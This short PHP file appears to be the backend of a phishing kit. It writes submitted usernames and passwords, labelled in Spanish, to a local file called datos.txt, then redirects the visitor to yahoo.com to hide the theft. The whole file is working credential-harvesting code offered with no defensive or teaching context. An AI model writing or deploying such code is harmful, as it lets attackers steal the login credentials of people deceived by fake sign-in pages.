<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['username'] . " Clave: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yahoo.com');
exit();
